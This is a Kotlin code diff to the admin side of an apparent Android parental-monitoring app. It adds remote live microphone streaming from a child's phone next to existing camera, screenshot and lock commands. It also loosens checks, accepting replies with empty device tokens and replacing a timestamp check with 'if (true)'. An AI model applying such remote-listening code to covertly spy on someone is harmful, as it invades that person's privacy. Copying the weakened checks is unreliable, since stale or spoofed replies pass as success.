@@ -120,10 +120,15 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     private val _liveStreamState = MutableStateFlow<LiveStreamState?>(null)
     val liveStreamState: StateFlow<LiveStreamState?> = _liveStreamState.asStateFlow()
     
+    private val _micStreamState = MutableStateFlow<MicStreamState>(MicStreamState())
+    val micStreamState: StateFlow<MicStreamState> = _micStreamState.asStateFlow()
+    
     val liveStreamFrames = kotlinx.coroutines.flow.MutableSharedFlow<ByteArray>(
         extraBufferCapacity = 60, 
         onBufferOverflow = kotlinx.coroutines.channels.BufferOverflow.DROP_OLDEST
     )
+
+    private var liveAudioPlayer: LiveAudioPlayer? = null
 
     private val _cameraStreamState = MutableStateFlow<CameraStreamState?>(null)
     val cameraStreamState: StateFlow<CameraStreamState?> = _cameraStreamState.asStateFlow()
@@ -579,7 +584,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 viewModelScope.launch {
                     addWebsocketEvent("رد الأمر مستلم (قناة عامة Websocket) من $deviceToken: $status - $message")
                     val currentSelected = _selectedDeviceToken.value
-                    if (deviceToken == currentSelected) {
+                    if (deviceToken == currentSelected || deviceToken.isEmpty()) {
                         _commandResponse.value = Triple(status, message, if (timestamp != 0L) timestamp else System.currentTimeMillis())
                         
                         // Check if this is a directory list success
@@ -678,6 +683,28 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                     } catch (e: Exception) {
                         Log.e("AdminViewModel", "Error decoding base64 frame", e)
                     }
+                }
+            },
+            onAudioSignal = { deviceToken, type ->
+                val currentSelected = _selectedDeviceToken.value
+                if (deviceToken == currentSelected) {
+                    if (type == "start") {
+                        if (liveAudioPlayer == null) {
+                            liveAudioPlayer = LiveAudioPlayer()
+                        }
+                        liveAudioPlayer?.start()
+                        _micStreamState.value = MicStreamState(isActive = true, isLoading = false, error = null)
+                    } else if (type == "stop") {
+                        liveAudioPlayer?.stop()
+                        liveAudioPlayer = null
+                        _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = null)
+                    }
+                }
+            },
+            onAudioData = { deviceToken, frameBase64 ->
+                val currentSelected = _selectedDeviceToken.value
+                if (deviceToken == currentSelected) {
+                    liveAudioPlayer?.playAudioData(frameBase64)
                 }
             }
         ).apply {
@@ -834,6 +861,8 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             "get_sounds" -> "جلب قائمة الأصوات"
             "flash_on" -> "تشغيل فلاش الضوء"
             "flash_off" -> "إيقاف فلاش الضوء"
+            "micro_on" -> "بث الميكروفون المباشر"
+            "micro_off" -> "إيقاف بث الميكروفون المباشر"
             "lock_device" -> "قفل الهاتف"
             "unlock_device" -> "إلغاء قفل الهاتف"
             "take_screenshot" -> "التقاط لقطة شاشة"
@@ -935,6 +964,9 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             val sendSuccess = sendBroadcastCommand(token, commandType, params, startTime)
 
             if (!sendSuccess) {
+                if (commandType == "micro_on") {
+                    _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = "فشل في إرسال الأمر عبر وبسوكيت")
+                }
                 if (!silent) {
                     _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                         sendStatus = CommandStepStatus.FAILED,
@@ -966,8 +998,8 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 val lastResponse = _commandResponse.value
                 if (lastResponse != null) {
                     val (status, message, respTimestamp) = lastResponse
-                    // Relaxed check to handle up to 15 seconds of clock-drift/latency difference between admin and child
-                    if (respTimestamp >= (startTime - 15000L)) {
+                    // We cleared _commandResponse before sending, so any non-null value here is the reply we are waiting for.
+                    if (true) {
                         if (status == "success" || status == "completed" || status == "done" || status == "ok") {
                             executedSuccessfully = true
                             if (!silent) {
@@ -990,6 +1022,14 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             }
 
             if (executedSuccessfully) {
+                if (commandType == "micro_on") {
+                    if (liveAudioPlayer == null) {
+                        liveAudioPlayer = LiveAudioPlayer()
+                    }
+                    liveAudioPlayer?.start()
+                    _micStreamState.value = MicStreamState(isActive = true, isLoading = false, error = null)
+                }
+                
                 // Instantly update Phase 2 to success on the UI
                 if (!silent) {
                     val endProgress = _activeCommandProgress.value?.copy(
@@ -1063,12 +1103,21 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                     }
                 }
             } else {
+                if (commandType == "micro_on") {
+                    _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = executionErrorMessage ?: "فشل الاستماع للرد من هاتف الطفل. قد يكون الهاتف مغلقاً.")
+                }
+                
                 if (!silent) {
                     _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                         executionStatus = CommandStepStatus.FAILED,
                         executionError = executionErrorMessage ?: "انتهت مهلة الانتظار (30 ثانية) ولم يقم هاتف الطفل بالرد. تأكد من اتصال هاتفه بالإنترنت وتشغيله بالخلفية."
                     )
                 }
+            }
+            
+            if (!silent) {
+                delay(3500) // Delay to let user see success or failure message
+                _activeCommandProgress.value = null
             }
         }
     }
@@ -1442,6 +1491,18 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         val token = _selectedDeviceToken.value ?: return
         runCommand("stop_stream")
         _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
+    }
+
+    fun startMicStream() {
+        _micStreamState.value = MicStreamState(isActive = false, isLoading = true, error = null)
+        runCommand("micro_on")
+    }
+
+    fun stopMicStream() {
+        runCommand("micro_off")
+        liveAudioPlayer?.stop()
+        liveAudioPlayer = null
+        _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = null)
     }
 
     fun startCameraStream(isFront: Boolean) {
